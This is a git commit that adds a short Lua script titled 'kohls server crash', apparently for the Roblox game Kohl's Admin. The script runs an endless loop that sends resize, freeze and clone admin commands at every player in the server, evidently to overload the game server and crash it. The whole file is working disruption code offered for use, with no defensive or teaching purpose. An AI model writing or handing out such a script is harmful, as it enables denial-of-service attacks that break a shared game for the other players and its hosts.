2f5a8e034a6c71547609a61a929274f334cf4d63
trollfacenan <102139586+trollfacenan@users.noreply.github.com>
2022-04-20 21:10:08 +0500

    Create kohls server crash.lua

---
+++ kohls server crash.lua
@@ -0,0 +1,10 @@
+while wait() do
+		for i = 1,3 do 
+			game:GetService("Players"):Chat("size all 0.3")
+		end
+		game:GetService("Players"):Chat("freeze all")
+		for i = 1,3 do
+			game:GetService("Players"):Chat("size all 10")
+		end
+		game:GetService("Players"):Chat("clone all")
+end
